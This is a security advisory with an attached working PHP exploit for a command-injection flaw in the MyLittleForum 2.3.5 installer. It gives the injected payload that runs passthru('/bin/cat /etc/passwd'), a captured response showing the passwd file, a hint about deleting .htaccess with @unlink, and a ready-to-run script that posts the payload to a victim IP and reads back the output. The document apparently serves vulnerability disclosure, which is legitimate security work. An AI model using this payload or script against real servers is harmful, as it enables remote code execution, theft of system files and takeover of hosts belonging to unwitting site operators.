@@ -1,0 +1,225 @@
+/*
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/MYLITTLEFORUM-PHP-CMD-EXECUTION.txt
+
+[+] ISR: APPARITIONSEC
+
+
+Vendor:
+=================
+mylittleforum.net
+
+Download:
+github.com/ilosuna/mylittleforum/releases/tag/v2.3.5
+
+
+Product:
+===================
+MyLittleForum 2.3.5
+
+my little forum is a simple PHP and MySQL based internet forum that
+displays the messages in classical threaded
+view (tree structure). The main claim of this web forum is simplicity.
+Furthermore it should be easy to install
+and run on a standard server configuration with PHP and MySQL.
+
+
+Vulnerability Type:
+=======================
+PHP Command Execution
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+When setting up mylittleforum CMS users will have to walk thru an
+installation script and provide details for the application like the
+forums email address, name, admin email, admin password, database name
+etc...
+
+However, no input validation / checks exists for that installation script.
+Low privileged users can then supply arbitrary PHP code for
+the Database Name. The PHP command values will get written to the
+config/db_settings.php file and processed by the application. Since
+we supply an invalid Database Name a MySQL error will be thrown but the
+injected PHP payload will also be executed on the host system.
+
+If the CMS is installed by low privileged user and that user has basic
+MySQL database authorization to run the install for the CMS it
+can result in a privilege escalation, remote command execution and complete
+takeover of the host server.
+
+The /config/db_settings.php is protected by .htaccess file but we can write
+directly to "db_settings.php" file and execute code directly
+from /install/index.php file bypassing any access control provided by the
+.htaccess file or we just delete it by adding call to PHP function
+@unlink('.htaccess') to our injected PHP payload.
+
+
+1) Browse to http://localhost/mylittleforum-2.3.5/install/index.php
+
+
+2) For Database Name input field enter the below PHP code for POC.
+';?><?php echo passthru('/bin/cat /etc/passwd');'
+
+This results in config/db_settings.php file being injected with our
+arbitrary PHP code.
+$db_settings['database'] = '';?><?php echo passthru('/bin/cat
+/etc/passwd');'';
+
+
+3) Make another HTTP GET request to same page "/install/index.php" file and
+done!... we access /etc/passwd system file.
+
+
+HTTP/1.1 200 OK
+Date: Fri, 24 Jun 2016 03:01:13 GMT
+Server: Apache/2.4.12 (Unix) OpenSSL/1.0.1m PHP/5.6.8 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: PHP/5.6.8
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+
+etc...
+
+
+Exploit code(s):
+===============
+
+1) Download and unpack mylittleforum-2.3.5 upload to web server (Linux), chmod -R 777 etc...
+2) Run below PHP script from Command line from remote work station
+3) BOOM we can now read Linux "/etc/passwd" file on remote server
+*/
+
+<?php
+#mylittleforum-2.3.5 PHP CMD Execution Exploit
+#by hyp3rlinx
+#ISR: apparitionsec
+#hyp3rlinx.altervista.org
+#cat Linux system file '/etc/passwd' POC
+#tested RH Linux 5
+#=======================================================
+
+if($argc<5){
+echo "myLittleForum CMS PHP Command Execution Exploit\r\n";
+echo "Usage: <IP>,<MySQL-USER>,<MySQL-PASSWD>,<ROOT DIR>\r\n";
+echo "================= by hyp3rlinx ===================\r\n";
+exit();
+}
+
+$port=80;                   #Default port
+$victim=$argv[1];           #IP
+$user=$argv[2];             #MySQL username
+$pwd=$argv[3];              #MySQL password
+$root_dir=$argv[4];         #/mylittleforum-2.3.5
+$uri="/install/index.php";  #PHP CMD inject entry point
+
+$s = fsockopen($victim, $port, $errno, $errstr, 10);
+if(!$s){echo "Cant connect to the server!"; exit();}
+
+$CMD_INJECTTION="forum_name=PWN".
+               "&forum_address=http://$victim/$root_dir/".
+"&forum_email=x@x.com".
+"&admin_name=$user".
+"&admin_email=x@x.com".
+"&admin_pw=$pwd".
+"&admin_pw_conf=$pwd".
+"&host=localhost".
+"&database=';?><?php echo passthru('/bin/cat /etc/passwd');'".
+"&user=$user".
+"&password=$pwd".
+"&table_prefix=mlf2_".
+"&install_submit=OK+-+Install+forum".
+"&language_file=english.lang";
+
+    #Inject commands
+    $out = "POST /$root_dir/$uri HTTP/1.1\r\n";
+    $out .= "Host: $victim\r\n";
+    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
+    $out .= 'Content-Length: ' . strlen($CMD_INJECTTION) . "\r\n";
+    $out .= "Connection: close\r\n\r\n";
+    fwrite($s, $out);
+    fwrite($s, $CMD_INJECTTION);
+    fclose($s);
+    sleep(2);
+
+    #Second HTTP request to read Linux /etc/passwd file in the response
+    $out="";
+    $s = fsockopen($victim, $port, $errno, $errstr, 10);
+    $out = "GET /$root_dir/$uri HTTP/1.1\r\n";
+    $out .= "Host: $victim\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($s, $out);
+
+    $r='';
+
+     while (!feof($s)) {
+         $r=fgets($s, 128);
+         echo $r;
+        if(strpos($r,'<!DOCTYPE')!==FALSE){
+           break;
+         }
+       }
+fclose($s);
+?>
+
+/*
+Disclosure Timeline:
+=================================
+Vendor Notification: No Reply
+June 27, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===========================================
+(High) 8.7
+CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
+*/
